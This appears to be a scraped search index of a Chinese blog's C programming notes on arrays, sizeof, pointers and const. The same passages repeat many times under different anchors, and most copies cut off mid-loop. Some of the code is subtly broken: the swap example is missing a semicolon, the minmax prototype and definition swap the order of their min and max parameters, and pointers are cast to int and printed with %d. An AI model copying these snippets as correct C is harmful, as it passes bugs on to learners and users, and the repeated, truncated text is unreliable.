数组的大小sizeof给出整个数组占据的内容的大小，单位是字节 sizeof(a)/sizeof(a[0]) sizeof(a[0])给出数组中单个元素的大小，于是相除就得到了数组的单元个数 数组的赋值数组变量本身不能被赋值 要把一个数组的所有元素交给另一个数组，必须采用遍历 遍历数组 for ( i=0 ; i","date":"2023-11-17","objectID":"/c_language_notes/:8:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#集成初始化时的定位"},{"categories":["Programing"],"content":"\r8.2数组运算\r数组的集成初始化 int a[] = {2,3,4,45,5,6,4}; 集成初始化时的定位 int a[10] = {[0]=2, [2]=3, 6 }; 用[n]在初始化数据中给出定位 没有定位的数据在前面的位置后面 没有位置的值补零 也可以不给出数组大小，让编译器算 特别适合初始数据稀疏的数组 数组未初始化默认为0 **但要注意，**在使用前尽量将数组初始化，至少把数组第一个元素初始化，剩余元素会自动初始化为0, 一般来说，全局变量，静态变量位于数据区，默认初始化为0，局部数组根据编译器的特点有所不一样 数组的大小sizeof给出整个数组占据的内容的大小，单位是字节 sizeof(a)/sizeof(a[0]) sizeof(a[0])给出数组中单个元素的大小，于是相除就得到了数组的单元个数 数组的赋值数组变量本身不能被赋值 要把一个数组的所有元素交给另一个数组，必须采用遍历 遍历数组 for ( i=0 ; i","date":"2023-11-17","objectID":"/c_language_notes/:8:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#数组的大小"},{"categories":["Programing"],"content":"\r8.2数组运算\r数组的集成初始化 int a[] = {2,3,4,45,5,6,4}; 集成初始化时的定位 int a[10] = {[0]=2, [2]=3, 6 }; 用[n]在初始化数据中给出定位 没有定位的数据在前面的位置后面 没有位置的值补零 也可以不给出数组大小，让编译器算 特别适合初始数据稀疏的数组 数组未初始化默认为0 **但要注意，**在使用前尽量将数组初始化，至少把数组第一个元素初始化，剩余元素会自动初始化为0, 一般来说，全局变量，静态变量位于数据区，默认初始化为0，局部数组根据编译器的特点有所不一样 数组的大小sizeof给出整个数组占据的内容的大小，单位是字节 sizeof(a)/sizeof(a[0]) sizeof(a[0])给出数组中单个元素的大小，于是相除就得到了数组的单元个数 数组的赋值数组变量本身不能被赋值 要把一个数组的所有元素交给另一个数组，必须采用遍历 遍历数组 for ( i=0 ; i","date":"2023-11-17","objectID":"/c_language_notes/:8:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#数组的赋值"},{"categories":["Programing"],"content":"\r8.2数组运算\r数组的集成初始化 int a[] = {2,3,4,45,5,6,4}; 集成初始化时的定位 int a[10] = {[0]=2, [2]=3, 6 }; 用[n]在初始化数据中给出定位 没有定位的数据在前面的位置后面 没有位置的值补零 也可以不给出数组大小，让编译器算 特别适合初始数据稀疏的数组 数组未初始化默认为0 **但要注意，**在使用前尽量将数组初始化，至少把数组第一个元素初始化，剩余元素会自动初始化为0, 一般来说，全局变量，静态变量位于数据区，默认初始化为0，局部数组根据编译器的特点有所不一样 数组的大小sizeof给出整个数组占据的内容的大小，单位是字节 sizeof(a)/sizeof(a[0]) sizeof(a[0])给出数组中单个元素的大小，于是相除就得到了数组的单元个数 数组的赋值数组变量本身不能被赋值 要把一个数组的所有元素交给另一个数组，必须采用遍历 遍历数组 for ( i=0 ; i","date":"2023-11-17","objectID":"/c_language_notes/:8:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#遍历数组"},{"categories":["Programing"],"content":"\r8.2数组运算\r数组的集成初始化 int a[] = {2,3,4,45,5,6,4}; 集成初始化时的定位 int a[10] = {[0]=2, [2]=3, 6 }; 用[n]在初始化数据中给出定位 没有定位的数据在前面的位置后面 没有位置的值补零 也可以不给出数组大小，让编译器算 特别适合初始数据稀疏的数组 数组未初始化默认为0 **但要注意，**在使用前尽量将数组初始化，至少把数组第一个元素初始化，剩余元素会自动初始化为0, 一般来说，全局变量，静态变量位于数据区，默认初始化为0，局部数组根据编译器的特点有所不一样 数组的大小sizeof给出整个数组占据的内容的大小，单位是字节 sizeof(a)/sizeof(a[0]) sizeof(a[0])给出数组中单个元素的大小，于是相除就得到了数组的单元个数 数组的赋值数组变量本身不能被赋值 要把一个数组的所有元素交给另一个数组，必须采用遍历 遍历数组 for ( i=0 ; i","date":"2023-11-17","objectID":"/c_language_notes/:8:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#数组查找"},{"categories":["Programing"],"content":"\r8.2数组运算\r数组的集成初始化 int a[] = {2,3,4,45,5,6,4}; 集成初始化时的定位 int a[10] = {[0]=2, [2]=3, 6 }; 用[n]在初始化数据中给出定位 没有定位的数据在前面的位置后面 没有位置的值补零 也可以不给出数组大小，让编译器算 特别适合初始数据稀疏的数组 数组未初始化默认为0 **但要注意，**在使用前尽量将数组初始化，至少把数组第一个元素初始化，剩余元素会自动初始化为0, 一般来说，全局变量，静态变量位于数据区，默认初始化为0，局部数组根据编译器的特点有所不一样 数组的大小sizeof给出整个数组占据的内容的大小，单位是字节 sizeof(a)/sizeof(a[0]) sizeof(a[0])给出数组中单个元素的大小，于是相除就得到了数组的单元个数 数组的赋值数组变量本身不能被赋值 要把一个数组的所有元素交给另一个数组，必须采用遍历 遍历数组 for ( i=0 ; i","date":"2023-11-17","objectID":"/c_language_notes/:8:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#计算斐波那契数列"},{"categories":["Programing"],"content":"\r8.2数组运算\r数组的集成初始化 int a[] = {2,3,4,45,5,6,4}; 集成初始化时的定位 int a[10] = {[0]=2, [2]=3, 6 }; 用[n]在初始化数据中给出定位 没有定位的数据在前面的位置后面 没有位置的值补零 也可以不给出数组大小，让编译器算 特别适合初始数据稀疏的数组 数组未初始化默认为0 **但要注意，**在使用前尽量将数组初始化，至少把数组第一个元素初始化，剩余元素会自动初始化为0, 一般来说，全局变量，静态变量位于数据区，默认初始化为0，局部数组根据编译器的特点有所不一样 数组的大小sizeof给出整个数组占据的内容的大小，单位是字节 sizeof(a)/sizeof(a[0]) sizeof(a[0])给出数组中单个元素的大小，于是相除就得到了数组的单元个数 数组的赋值数组变量本身不能被赋值 要把一个数组的所有元素交给另一个数组，必须采用遍历 遍历数组 for ( i=0 ; i","date":"2023-11-17","objectID":"/c_language_notes/:8:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#查找数组中最小值及其下标"},{"categories":["Programing"],"content":"\r8.2数组运算\r数组的集成初始化 int a[] = {2,3,4,45,5,6,4}; 集成初始化时的定位 int a[10] = {[0]=2, [2]=3, 6 }; 用[n]在初始化数据中给出定位 没有定位的数据在前面的位置后面 没有位置的值补零 也可以不给出数组大小，让编译器算 特别适合初始数据稀疏的数组 数组未初始化默认为0 **但要注意，**在使用前尽量将数组初始化，至少把数组第一个元素初始化，剩余元素会自动初始化为0, 一般来说，全局变量，静态变量位于数据区，默认初始化为0，局部数组根据编译器的特点有所不一样 数组的大小sizeof给出整个数组占据的内容的大小，单位是字节 sizeof(a)/sizeof(a[0]) sizeof(a[0])给出数组中单个元素的大小，于是相除就得到了数组的单元个数 数组的赋值数组变量本身不能被赋值 要把一个数组的所有元素交给另一个数组，必须采用遍历 遍历数组 for ( i=0 ; i","date":"2023-11-17","objectID":"/c_language_notes/:8:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#二维数组"},{"categories":["Programing"],"content":"\r8.2数组运算\r数组的集成初始化 int a[] = {2,3,4,45,5,6,4}; 集成初始化时的定位 int a[10] = {[0]=2, [2]=3, 6 }; 用[n]在初始化数据中给出定位 没有定位的数据在前面的位置后面 没有位置的值补零 也可以不给出数组大小，让编译器算 特别适合初始数据稀疏的数组 数组未初始化默认为0 **但要注意，**在使用前尽量将数组初始化，至少把数组第一个元素初始化，剩余元素会自动初始化为0, 一般来说，全局变量，静态变量位于数据区，默认初始化为0，局部数组根据编译器的特点有所不一样 数组的大小sizeof给出整个数组占据的内容的大小，单位是字节 sizeof(a)/sizeof(a[0]) sizeof(a[0])给出数组中单个元素的大小，于是相除就得到了数组的单元个数 数组的赋值数组变量本身不能被赋值 要把一个数组的所有元素交给另一个数组，必须采用遍历 遍历数组 for ( i=0 ; i","date":"2023-11-17","objectID":"/c_language_notes/:8:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#二维数组遍历"},{"categories":["Programing"],"content":"\r8.2数组运算\r数组的集成初始化 int a[] = {2,3,4,45,5,6,4}; 集成初始化时的定位 int a[10] = {[0]=2, [2]=3, 6 }; 用[n]在初始化数据中给出定位 没有定位的数据在前面的位置后面 没有位置的值补零 也可以不给出数组大小，让编译器算 特别适合初始数据稀疏的数组 数组未初始化默认为0 **但要注意，**在使用前尽量将数组初始化，至少把数组第一个元素初始化，剩余元素会自动初始化为0, 一般来说，全局变量，静态变量位于数据区，默认初始化为0，局部数组根据编译器的特点有所不一样 数组的大小sizeof给出整个数组占据的内容的大小，单位是字节 sizeof(a)/sizeof(a[0]) sizeof(a[0])给出数组中单个元素的大小，于是相除就得到了数组的单元个数 数组的赋值数组变量本身不能被赋值 要把一个数组的所有元素交给另一个数组，必须采用遍历 遍历数组 for ( i=0 ; i","date":"2023-11-17","objectID":"/c_language_notes/:8:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#二维数组的初始化"},{"categories":["Programing"],"content":"\r8.2数组运算\r数组的集成初始化 int a[] = {2,3,4,45,5,6,4}; 集成初始化时的定位 int a[10] = {[0]=2, [2]=3, 6 }; 用[n]在初始化数据中给出定位 没有定位的数据在前面的位置后面 没有位置的值补零 也可以不给出数组大小，让编译器算 特别适合初始数据稀疏的数组 数组未初始化默认为0 **但要注意，**在使用前尽量将数组初始化，至少把数组第一个元素初始化，剩余元素会自动初始化为0, 一般来说，全局变量，静态变量位于数据区，默认初始化为0，局部数组根据编译器的特点有所不一样 数组的大小sizeof给出整个数组占据的内容的大小，单位是字节 sizeof(a)/sizeof(a[0]) sizeof(a[0])给出数组中单个元素的大小，于是相除就得到了数组的单元个数 数组的赋值数组变量本身不能被赋值 要把一个数组的所有元素交给另一个数组，必须采用遍历 遍历数组 for ( i=0 ; i","date":"2023-11-17","objectID":"/c_language_notes/:8:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#找出矩阵中最大值"},{"categories":["Programing"],"content":"\r8.2数组运算\r数组的集成初始化 int a[] = {2,3,4,45,5,6,4}; 集成初始化时的定位 int a[10] = {[0]=2, [2]=3, 6 }; 用[n]在初始化数据中给出定位 没有定位的数据在前面的位置后面 没有位置的值补零 也可以不给出数组大小，让编译器算 特别适合初始数据稀疏的数组 数组未初始化默认为0 **但要注意，**在使用前尽量将数组初始化，至少把数组第一个元素初始化，剩余元素会自动初始化为0, 一般来说，全局变量，静态变量位于数据区，默认初始化为0，局部数组根据编译器的特点有所不一样 数组的大小sizeof给出整个数组占据的内容的大小，单位是字节 sizeof(a)/sizeof(a[0]) sizeof(a[0])给出数组中单个元素的大小，于是相除就得到了数组的单元个数 数组的赋值数组变量本身不能被赋值 要把一个数组的所有元素交给另一个数组，必须采用遍历 遍历数组 for ( i=0 ; i","date":"2023-11-17","objectID":"/c_language_notes/:8:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#判断回文"},{"categories":["Programing"],"content":"\r9.1指针\r运算符\u0026 scanf(\"%d\",\u0026i); 获得变量地址，只能对变量取地址 输出地址 printf(\"%p\\n\",\u0026i); 指针 int* p = \u0026i; 表示内存地址的变量 星号可以靠近p也可以靠近int，但 int* p,q; *p是一个指针变量，而q是普通变量 指针定义 int *p; //定义一个指针变量p,指向整型变量 char *cp; //定义一个指针变量cp，指向字符型变量 float *fp; double *dp1，*dp2; //定义多个指针时，每个变量名前都要加上* 不同的类型名代表该指针所指向的内存空间上所存放的数据的类型 作为参数的指针 void f(int *p); 在被调用的时候得到了某个变量的地址： int i = 0; f(\u0026i); 访问地址上的变量**(指针声明符)是一个单目运算符(运算的优先级较高)，用来访问指针的值所表示的地址上的变量 指针应用\r交换两个变量的值 void swap(int *pa,int *pb) { int t = *pa; *pa = *pb *pb = t; } 寻找数组中最大值和最小值 #include \u003cstdio.h\u003e void minmax(int a[], int len, int* max, int* min); int main() { int a[] = { 1,2,3,4,5,6,7,8,9,0,33,55 }; int min, max; minmax(a, sizeof(a) / sizeof(a[0]), \u0026min, \u0026max); printf(\"min=%d,max=%d\\n\", min, max); return 0; } void minmax(int a[], int len, int* min, int* max) { int i; *min = *max = a[0]; for (i = 1; i \u003c len; ++i) { if (a[i] \u003c *min) { *min = a[i]; } if (a[i] \u003e *max) { *max = a[i]; } } } 指针常见的错误定义了指针变量，还没有指向任何变量，就开始使用指针 另外，++*p、(*p)++都是将指针p所指向的变量值加1，而表达式*p++等价于*(p++)随后p不再指向变量a 传入函数的数组函数表中的数组实际上是指针 sizeof(a)==sizeof(int*) 但是可以用数组的运算符[]进行运算 数组名作为函数的参数数组的形参a实际上是一个指针，进行参数传递时，主函数传递的是数组a的基地址，数组元素本身不被复制。 int sum(int a[ ],int n){ int i,s =0; for(i=0;i\u003cn;++i){ s+=a[i]; } return s; } 数组变量是特殊的指针数组变量本身表达地址 int a[10]; int*p=a; //无需用\u0026取地址 数组的单元表达的是变量，需要用\u0026取地址 a == \u0026a[0] []运算符可以对数组做，也可以对指针做 p[0] \u003c==\u003e a[o] *运算符可以对指针做，也可以对数组做 数组变量是const的指针，所以不能被赋值 int a[] \u003c==\u003e int * const a = 指针、数组和地址间的关系数组的基地址是在内存中存储数组的起始位置，是数组中第一个元素的地址 数组名的值是一个特殊的固定地址，可以看作是指针常量，不是变量，不能对其进行赋值操作 下面两条语句是等价的： p=a; p=\u0026a[0]; 同时下面两条语句也是等价的： p=a+1; p=\u0026a[1]; 通过指针实现数组求和e.g.输入正整数n，再输入，n个整数作为数组元素，分别使用数组和指针来计算并输出他们的和 #include\u003cstdio.h\u003e int main(){ int n,i; int a[10]; int *p; int sum1=0,sum2=0; printf(\"Enter n:\"); scanf(\"%d\",\u0026n); printf(\"Enter %d integers:\",n); for(i=0;i\u003cn;i++){ scanf(\"%d\",\u0026a[i]); } for(p=a;p\u003ca+n;p++){ sum2=sum2+*p; } for(i=0;i\u003cn;i++){ sum1=sum1+*(a+i); } printf(\"Calculated by arry:%d\\n\",sum1); printf(\"Calculated by pointer:%d\\n\",sum2); return 0; } 通过以下方法也可以实现数组求和 p=a; sum=0; for(i=0;i\u003c100;i++){ sum+=p[i]; } 通过指针计算数组元素个数和数组元素的储存单元数 #include\u003cstdio.h\u003e int main(){ double a[2],*p,*q; p=\u0026a[0]; q=p+1; printf(\"%d\\n\",q-p); printf(\"%d\\n\", (int)q-(int)p); return 0; } 指针是const表示一旦得到了某个变量的地址，不能再指向其他变量 int * const q = \u0026i; //q 是const *q = 26 ; //OK q++ ; //ERROE const数组 const int a[] = {1,2,3,4,5,6}; ​ 数组变量已经是const的指针了，这里的const表明数组的每个单元都是const int ​ 所以必须通过初始化进行赋值 保护数组值因为把数组传入函数时传递的是地址，所以那个函数内部可以修改数组的值 为了保护数组不被函数破坏，可以设置参数为const int sum (const int a[] , int length ); ","date":"2023-11-17","objectID":"/c_language_notes/:9:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#91指针"},{"categories":["Programing"],"content":"\r9.1指针\r运算符\u0026 scanf(\"%d\",\u0026i); 获得变量地址，只能对变量取地址 输出地址 printf(\"%p\\n\",\u0026i); 指针 int* p = \u0026i; 表示内存地址的变量 星号可以靠近p也可以靠近int，但 int* p,q; *p是一个指针变量，而q是普通变量 指针定义 int *p; //定义一个指针变量p,指向整型变量 char *cp; //定义一个指针变量cp，指向字符型变量 float *fp; double *dp1，*dp2; //定义多个指针时，每个变量名前都要加上* 不同的类型名代表该指针所指向的内存空间上所存放的数据的类型 作为参数的指针 void f(int *p); 在被调用的时候得到了某个变量的地址： int i = 0; f(\u0026i); 访问地址上的变量**(指针声明符)是一个单目运算符(运算的优先级较高)，用来访问指针的值所表示的地址上的变量 指针应用\r交换两个变量的值 void swap(int *pa,int *pb) { int t = *pa; *pa = *pb *pb = t; } 寻找数组中最大值和最小值 #include void minmax(int a[], int len, int* max, int* min); int main() { int a[] = { 1,2,3,4,5,6,7,8,9,0,33,55 }; int min, max; minmax(a, sizeof(a) / sizeof(a[0]), \u0026min, \u0026max); printf(\"min=%d,max=%d\\n\", min, max); return 0; } void minmax(int a[], int len, int* min, int* max) { int i; *min = *max = a[0]; for (i = 1; i \u003c len; ++i) { if (a[i] \u003c *min) { *min = a[i]; } if (a[i] \u003e *max) { *max = a[i]; } } } 指针常见的错误定义了指针变量，还没有指向任何变量，就开始使用指针 另外，++*p、(*p)++都是将指针p所指向的变量值加1，而表达式*p++等价于*(p++)随后p不再指向变量a 传入函数的数组函数表中的数组实际上是指针 sizeof(a)==sizeof(int*) 但是可以用数组的运算符[]进行运算 数组名作为函数的参数数组的形参a实际上是一个指针，进行参数传递时，主函数传递的是数组a的基地址，数组元素本身不被复制。 int sum(int a[ ],int n){ int i,s =0; for(i=0;i","date":"2023-11-17","objectID":"/c_language_notes/:9:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#运算符-1"},{"categories":["Programing"],"content":"\r9.1指针\r运算符\u0026 scanf(\"%d\",\u0026i); 获得变量地址，只能对变量取地址 输出地址 printf(\"%p\\n\",\u0026i); 指针 int* p = \u0026i; 表示内存地址的变量 星号可以靠近p也可以靠近int，但 int* p,q; *p是一个指针变量，而q是普通变量 指针定义 int *p; //定义一个指针变量p,指向整型变量 char *cp; //定义一个指针变量cp，指向字符型变量 float *fp; double *dp1，*dp2; //定义多个指针时，每个变量名前都要加上* 不同的类型名代表该指针所指向的内存空间上所存放的数据的类型 作为参数的指针 void f(int *p); 在被调用的时候得到了某个变量的地址： int i = 0; f(\u0026i); 访问地址上的变量**(指针声明符)是一个单目运算符(运算的优先级较高)，用来访问指针的值所表示的地址上的变量 指针应用\r交换两个变量的值 void swap(int *pa,int *pb) { int t = *pa; *pa = *pb *pb = t; } 寻找数组中最大值和最小值 #include void minmax(int a[], int len, int* max, int* min); int main() { int a[] = { 1,2,3,4,5,6,7,8,9,0,33,55 }; int min, max; minmax(a, sizeof(a) / sizeof(a[0]), \u0026min, \u0026max); printf(\"min=%d,max=%d\\n\", min, max); return 0; } void minmax(int a[], int len, int* min, int* max) { int i; *min = *max = a[0]; for (i = 1; i \u003c len; ++i) { if (a[i] \u003c *min) { *min = a[i]; } if (a[i] \u003e *max) { *max = a[i]; } } } 指针常见的错误定义了指针变量，还没有指向任何变量，就开始使用指针 另外，++*p、(*p)++都是将指针p所指向的变量值加1，而表达式*p++等价于*(p++)随后p不再指向变量a 传入函数的数组函数表中的数组实际上是指针 sizeof(a)==sizeof(int*) 但是可以用数组的运算符[]进行运算 数组名作为函数的参数数组的形参a实际上是一个指针，进行参数传递时，主函数传递的是数组a的基地址，数组元素本身不被复制。 int sum(int a[ ],int n){ int i,s =0; for(i=0;i","date":"2023-11-17","objectID":"/c_language_notes/:9:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#输出地址"},{"categories":["Programing"],"content":"\r9.1指针\r运算符\u0026 scanf(\"%d\",\u0026i); 获得变量地址，只能对变量取地址 输出地址 printf(\"%p\\n\",\u0026i); 指针 int* p = \u0026i; 表示内存地址的变量 星号可以靠近p也可以靠近int，但 int* p,q; *p是一个指针变量，而q是普通变量 指针定义 int *p; //定义一个指针变量p,指向整型变量 char *cp; //定义一个指针变量cp，指向字符型变量 float *fp; double *dp1，*dp2; //定义多个指针时，每个变量名前都要加上* 不同的类型名代表该指针所指向的内存空间上所存放的数据的类型 作为参数的指针 void f(int *p); 在被调用的时候得到了某个变量的地址： int i = 0; f(\u0026i); 访问地址上的变量**(指针声明符)是一个单目运算符(运算的优先级较高)，用来访问指针的值所表示的地址上的变量 指针应用\r交换两个变量的值 void swap(int *pa,int *pb) { int t = *pa; *pa = *pb *pb = t; } 寻找数组中最大值和最小值 #include void minmax(int a[], int len, int* max, int* min); int main() { int a[] = { 1,2,3,4,5,6,7,8,9,0,33,55 }; int min, max; minmax(a, sizeof(a) / sizeof(a[0]), \u0026min, \u0026max); printf(\"min=%d,max=%d\\n\", min, max); return 0; } void minmax(int a[], int len, int* min, int* max) { int i; *min = *max = a[0]; for (i = 1; i \u003c len; ++i) { if (a[i] \u003c *min) { *min = a[i]; } if (a[i] \u003e *max) { *max = a[i]; } } } 指针常见的错误定义了指针变量，还没有指向任何变量，就开始使用指针 另外，++*p、(*p)++都是将指针p所指向的变量值加1，而表达式*p++等价于*(p++)随后p不再指向变量a 传入函数的数组函数表中的数组实际上是指针 sizeof(a)==sizeof(int*) 但是可以用数组的运算符[]进行运算 数组名作为函数的参数数组的形参a实际上是一个指针，进行参数传递时，主函数传递的是数组a的基地址，数组元素本身不被复制。 int sum(int a[ ],int n){ int i,s =0; for(i=0;i","date":"2023-11-17","objectID":"/c_language_notes/:9:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#指针"},{"categories":["Programing"],"content":"\r9.1指针\r运算符\u0026 scanf(\"%d\",\u0026i); 获得变量地址，只能对变量取地址 输出地址 printf(\"%p\\n\",\u0026i); 指针 int* p = \u0026i; 表示内存地址的变量 星号可以靠近p也可以靠近int，但 int* p,q; *p是一个指针变量，而q是普通变量 指针定义 int *p; //定义一个指针变量p,指向整型变量 char *cp; //定义一个指针变量cp，指向字符型变量 float *fp; double *dp1，*dp2; //定义多个指针时，每个变量名前都要加上* 不同的类型名代表该指针所指向的内存空间上所存放的数据的类型 作为参数的指针 void f(int *p); 在被调用的时候得到了某个变量的地址： int i = 0; f(\u0026i); 访问地址上的变量**(指针声明符)是一个单目运算符(运算的优先级较高)，用来访问指针的值所表示的地址上的变量 指针应用\r交换两个变量的值 void swap(int *pa,int *pb) { int t = *pa; *pa = *pb *pb = t; } 寻找数组中最大值和最小值 #include void minmax(int a[], int len, int* max, int* min); int main() { int a[] = { 1,2,3,4,5,6,7,8,9,0,33,55 }; int min, max; minmax(a, sizeof(a) / sizeof(a[0]), \u0026min, \u0026max); printf(\"min=%d,max=%d\\n\", min, max); return 0; } void minmax(int a[], int len, int* min, int* max) { int i; *min = *max = a[0]; for (i = 1; i \u003c len; ++i) { if (a[i] \u003c *min) { *min = a[i]; } if (a[i] \u003e *max) { *max = a[i]; } } } 指针常见的错误定义了指针变量，还没有指向任何变量，就开始使用指针 另外，++*p、(*p)++都是将指针p所指向的变量值加1，而表达式*p++等价于*(p++)随后p不再指向变量a 传入函数的数组函数表中的数组实际上是指针 sizeof(a)==sizeof(int*) 但是可以用数组的运算符[]进行运算 数组名作为函数的参数数组的形参a实际上是一个指针，进行参数传递时，主函数传递的是数组a的基地址，数组元素本身不被复制。 int sum(int a[ ],int n){ int i,s =0; for(i=0;i","date":"2023-11-17","objectID":"/c_language_notes/:9:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#指针定义"},{"categories":["Programing"],"content":"\r9.1指针\r运算符\u0026 scanf(\"%d\",\u0026i); 获得变量地址，只能对变量取地址 输出地址 printf(\"%p\\n\",\u0026i); 指针 int* p = \u0026i; 表示内存地址的变量 星号可以靠近p也可以靠近int，但 int* p,q; *p是一个指针变量，而q是普通变量 指针定义 int *p; //定义一个指针变量p,指向整型变量 char *cp; //定义一个指针变量cp，指向字符型变量 float *fp; double *dp1，*dp2; //定义多个指针时，每个变量名前都要加上* 不同的类型名代表该指针所指向的内存空间上所存放的数据的类型 作为参数的指针 void f(int *p); 在被调用的时候得到了某个变量的地址： int i = 0; f(\u0026i); 访问地址上的变量**(指针声明符)是一个单目运算符(运算的优先级较高)，用来访问指针的值所表示的地址上的变量 指针应用\r交换两个变量的值 void swap(int *pa,int *pb) { int t = *pa; *pa = *pb *pb = t; } 寻找数组中最大值和最小值 #include void minmax(int a[], int len, int* max, int* min); int main() { int a[] = { 1,2,3,4,5,6,7,8,9,0,33,55 }; int min, max; minmax(a, sizeof(a) / sizeof(a[0]), \u0026min, \u0026max); printf(\"min=%d,max=%d\\n\", min, max); return 0; } void minmax(int a[], int len, int* min, int* max) { int i; *min = *max = a[0]; for (i = 1; i \u003c len; ++i) { if (a[i] \u003c *min) { *min = a[i]; } if (a[i] \u003e *max) { *max = a[i]; } } } 指针常见的错误定义了指针变量，还没有指向任何变量，就开始使用指针 另外，++*p、(*p)++都是将指针p所指向的变量值加1，而表达式*p++等价于*(p++)随后p不再指向变量a 传入函数的数组函数表中的数组实际上是指针 sizeof(a)==sizeof(int*) 但是可以用数组的运算符[]进行运算 数组名作为函数的参数数组的形参a实际上是一个指针，进行参数传递时，主函数传递的是数组a的基地址，数组元素本身不被复制。 int sum(int a[ ],int n){ int i,s =0; for(i=0;i","date":"2023-11-17","objectID":"/c_language_notes/:9:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#作为参数的指针"},{"categories":["Programing"],"content":"\r9.1指针\r运算符\u0026 scanf(\"%d\",\u0026i); 获得变量地址，只能对变量取地址 输出地址 printf(\"%p\\n\",\u0026i); 指针 int* p = \u0026i; 表示内存地址的变量 星号可以靠近p也可以靠近int，但 int* p,q; *p是一个指针变量，而q是普通变量 指针定义 int *p; //定义一个指针变量p,指向整型变量 char *cp; //定义一个指针变量cp，指向字符型变量 float *fp; double *dp1，*dp2; //定义多个指针时，每个变量名前都要加上* 不同的类型名代表该指针所指向的内存空间上所存放的数据的类型 作为参数的指针 void f(int *p); 在被调用的时候得到了某个变量的地址： int i = 0; f(\u0026i); 访问地址上的变量**(指针声明符)是一个单目运算符(运算的优先级较高)，用来访问指针的值所表示的地址上的变量 指针应用\r交换两个变量的值 void swap(int *pa,int *pb) { int t = *pa; *pa = *pb *pb = t; } 寻找数组中最大值和最小值 #include void minmax(int a[], int len, int* max, int* min); int main() { int a[] = { 1,2,3,4,5,6,7,8,9,0,33,55 }; int min, max; minmax(a, sizeof(a) / sizeof(a[0]), \u0026min, \u0026max); printf(\"min=%d,max=%d\\n\", min, max); return 0; } void minmax(int a[], int len, int* min, int* max) { int i; *min = *max = a[0]; for (i = 1; i \u003c len; ++i) { if (a[i] \u003c *min) { *min = a[i]; } if (a[i] \u003e *max) { *max = a[i]; } } } 指针常见的错误定义了指针变量，还没有指向任何变量，就开始使用指针 另外，++*p、(*p)++都是将指针p所指向的变量值加1，而表达式*p++等价于*(p++)随后p不再指向变量a 传入函数的数组函数表中的数组实际上是指针 sizeof(a)==sizeof(int*) 但是可以用数组的运算符[]进行运算 数组名作为函数的参数数组的形参a实际上是一个指针，进行参数传递时，主函数传递的是数组a的基地址，数组元素本身不被复制。 int sum(int a[ ],int n){ int i,s =0; for(i=0;i","date":"2023-11-17","objectID":"/c_language_notes/:9:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#访问地址上的变量"},{"categories":["Programing"],"content":"\r9.1指针\r运算符\u0026 scanf(\"%d\",\u0026i); 获得变量地址，只能对变量取地址 输出地址 printf(\"%p\\n\",\u0026i); 指针 int* p = \u0026i; 表示内存地址的变量 星号可以靠近p也可以靠近int，但 int* p,q; *p是一个指针变量，而q是普通变量 指针定义 int *p; //定义一个指针变量p,指向整型变量 char *cp; //定义一个指针变量cp，指向字符型变量 float *fp; double *dp1，*dp2; //定义多个指针时，每个变量名前都要加上* 不同的类型名代表该指针所指向的内存空间上所存放的数据的类型 作为参数的指针 void f(int *p); 在被调用的时候得到了某个变量的地址： int i = 0; f(\u0026i); 访问地址上的变量**(指针声明符)是一个单目运算符(运算的优先级较高)，用来访问指针的值所表示的地址上的变量 指针应用\r交换两个变量的值 void swap(int *pa,int *pb) { int t = *pa; *pa = *pb *pb = t; } 寻找数组中最大值和最小值 #include void minmax(int a[], int len, int* max, int* min); int main() { int a[] = { 1,2,3,4,5,6,7,8,9,0,33,55 }; int min, max; minmax(a, sizeof(a) / sizeof(a[0]), \u0026min, \u0026max); printf(\"min=%d,max=%d\\n\", min, max); return 0; } void minmax(int a[], int len, int* min, int* max) { int i; *min = *max = a[0]; for (i = 1; i \u003c len; ++i) { if (a[i] \u003c *min) { *min = a[i]; } if (a[i] \u003e *max) { *max = a[i]; } } } 指针常见的错误定义了指针变量，还没有指向任何变量，就开始使用指针 另外，++*p、(*p)++都是将指针p所指向的变量值加1，而表达式*p++等价于*(p++)随后p不再指向变量a 传入函数的数组函数表中的数组实际上是指针 sizeof(a)==sizeof(int*) 但是可以用数组的运算符[]进行运算 数组名作为函数的参数数组的形参a实际上是一个指针，进行参数传递时，主函数传递的是数组a的基地址，数组元素本身不被复制。 int sum(int a[ ],int n){ int i,s =0; for(i=0;i","date":"2023-11-17","objectID":"/c_language_notes/:9:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#指针应用"},{"categories":["Programing"],"content":"\r9.1指针\r运算符\u0026 scanf(\"%d\",\u0026i); 获得变量地址，只能对变量取地址 输出地址 printf(\"%p\\n\",\u0026i); 指针 int* p = \u0026i; 表示内存地址的变量 星号可以靠近p也可以靠近int，但 int* p,q; *p是一个指针变量，而q是普通变量 指针定义 int *p; //定义一个指针变量p,指向整型变量 char *cp; //定义一个指针变量cp，指向字符型变量 float *fp; double *dp1，*dp2; //定义多个指针时，每个变量名前都要加上* 不同的类型名代表该指针所指向的内存空间上所存放的数据的类型 作为参数的指针 void f(int *p); 在被调用的时候得到了某个变量的地址： int i = 0; f(\u0026i); 访问地址上的变量**(指针声明符)是一个单目运算符(运算的优先级较高)，用来访问指针的值所表示的地址上的变量 指针应用\r交换两个变量的值 void swap(int *pa,int *pb) { int t = *pa; *pa = *pb *pb = t; } 